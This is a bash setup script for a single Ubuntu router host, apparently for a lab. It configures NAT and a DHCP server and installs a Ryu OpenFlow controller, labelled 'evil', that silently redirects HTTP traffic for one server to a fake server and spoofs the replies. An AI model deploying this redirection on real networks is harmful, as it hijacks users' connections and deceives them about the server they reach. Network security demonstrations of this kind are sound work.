#!/bin/bash

test "${BASH_SOURCE[0]}" = "$0" || {
    echo "Error: '${BASH_SOURCE[0]}' should not be sourced"
    return 1
}

set -o pipefail         # proper status code for a pipeline
set -o errexit          # -e exit when seeing a nonzero status code
set -o nounset          # -u using unbound variable is an error
shopt -s failglob       # pathname expansion failing is an error

__my_exit_trap__ () {
    local LAST_STATUS=$? LAST_COMMAND="$BASH_COMMAND"
    if [[ $LAST_STATUS != 0 ]]
    then
        printf '\nCommand `%s` has nonzero exit status.\n\n' "$LAST_COMMAND"
    fi
}
trap __my_exit_trap__ EXIT

##############################################################################

# make sure we are executing this bash script on the expected machine

test "$(id -u)" = 0
grep -q 'Ubuntu 16.04' /etc/issue
test -e /sys/class/net/enp8s0
grep -q '3c:a8:2a:7f:b2:9d' /sys/class/net/enp8s0/address

##############################################################################

# set up the network interface for sharing Internet connectivity

echo > /etc/network/interfaces '
auto lo
iface lo inet loopback

auto enp8s0
iface enp8s0 inet static
        address 172.25.0.1/24
        post-up  ip address add 172.24.0.1/30 dev enp8s0 label enp8s0:0
        pre-down ip address del 172.24.0.1/30 dev enp8s0 label enp8s0:0
'

ifdown enp8s0
ifup enp8s0

##############################################################################

# set up NAT

echo > /etc/sysctl.conf 'net.ipv4.ip_forward=1'

sysctl -p > /dev/null

[[ "$(< /proc/sys/net/ipv4/ip_forward )" == 1 ]]

if ! dpkg -s iptables-persistent &> /dev/null; then
  debconf-set-selections <<<'iptables-persistent iptables-persistent/autosave_v4 boolean true'
  debconf-set-selections <<<'iptables-persistent iptables-persistent/autosave_v6 boolean true'
  apt-get install -y iptables-persistent
fi

iptables -t nat -F
iptables -t nat -A POSTROUTING ! -o enp8s0 -j MASQUERADE

service netfilter-persistent save &> /dev/null

##############################################################################

# set up a DHCP server

if ! dpkg -s isc-dhcp-server &> /dev/null; then
  apt-get install -y isc-dhcp-server
fi

echo > /etc/default/isc-dhcp-server 'INTERFACES="enp8s0"'

echo > /etc/dhcp/dhcpd.conf '
default-lease-time 600;
max-lease-time 7200;
option domain-name-servers 8.8.8.8, 8.8.4.4;
subnet 172.25.0.0 netmask 255.255.255.0 {
  range 172.25.0.10 172.25.0.254;
  option routers 172.25.0.1;
}
'

service isc-dhcp-server restart

##############################################################################

# set up a Ryu man-in-the-middle controller

if ! command -v ryu-manager > /dev/null; then
  if ! command -v pip3 > /dev/null; then
    apt-get install -y python3-pip
  fi
  pip3 install ryu
fi
command -v ryu-manager > /dev/null

cat > /usr/local/bin/mitm.py <<'MY_RYU_APP'
#!/bin/sh
''''exec /usr/bin/env ryu-manager --verbose --ofp-listen-host 172.24.0.1 --ofp-tcp-listen-port 6653 "$0"
'''

REAL_SERVER = ('140.112.8.116', 80)
FAKE_SERVER = ('140.109.20.229', 80)

from ryu.base import app_manager
from ryu.controller import handler
from ryu.controller import ofp_event
from ryu.ofproto import ofproto_v1_3

class MitmSwitch(app_manager.RyuApp):

    OFP_VERSIONS = [ofproto_v1_3.OFP_VERSION]

    def __init__(self, *args, **kwargs):
        super(MitmSwitch, self).__init__(*args, **kwargs)

    @handler.set_ev_cls(ofp_event.EventOFPSwitchFeatures, handler.CONFIG_DISPATCHER)
    def switch_features_handler(self, ev):
        datapath = ev.msg.datapath
        ofp = datapath.ofproto
        ofp_parser = datapath.ofproto_parser

        del_all_flows(datapath)

        match = ofp_parser.OFPMatch()
        actions = [ofp_parser.OFPActionOutput(ofp.OFPP_NORMAL)]
        add_flow(datapath, match, actions, priority=0)

        match = ofp_parser.OFPMatch(eth_type=0x0800, ip_proto=6,
                                    ipv4_dst=REAL_SERVER[0],
                                    tcp_dst=REAL_SERVER[1])
        actions = [ofp_parser.OFPActionSetField(ipv4_dst=FAKE_SERVER[0]),
                   ofp_parser.OFPActionSetField(tcp_dst=FAKE_SERVER[1]),
                   ofp_parser.OFPActionOutput(ofp.OFPP_NORMAL)]
        add_flow(datapath, match, actions, priority=65535)

        match = ofp_parser.OFPMatch(eth_type=0x0800, ip_proto=6,
                                    ipv4_src=FAKE_SERVER[0],
                                    tcp_src=FAKE_SERVER[1])
        actions = [ofp_parser.OFPActionSetField(ipv4_src=REAL_SERVER[0]),
                   ofp_parser.OFPActionSetField(tcp_src=REAL_SERVER[1]),
                   ofp_parser.OFPActionOutput(ofp.OFPP_NORMAL)]
        add_flow(datapath, match, actions, priority=65535)

def add_flow(datapath, match, actions, priority):
    ofp = datapath.ofproto
    ofp_parser = datapath.ofproto_parser
    inst = [ofp_parser.OFPInstructionActions(ofp.OFPIT_APPLY_ACTIONS, actions)]
    req = ofp_parser.OFPFlowMod(datapath=datapath,
                                priority=priority,
                                match=match,
                                instructions=inst)
    datapath.send_msg(req)

def del_all_flows(datapath):
    ofp = datapath.ofproto
    ofp_parser = datapath.ofproto_parser
    req = ofp_parser.OFPFlowMod(datapath=datapath,
                                command=ofp.OFPFC_DELETE,
                                out_port=ofp.OFPP_ANY,
                                out_group=ofp.OFPG_ANY)
    datapath.send_msg(req)
MY_RYU_APP
chmod +x /usr/local/bin/mitm.py

##############################################################################

# print some information to the screen

echo '

If you want to restart the DHCP server:

        service isc-dhcp-server restart

If you want to see a list of all current DHCP leases:

        dhcp-lease-list --lease /var/lib/dhcp/dhcpd.leases

If you want to run the evil man-in-the-middle controller:

        mitm.py

'
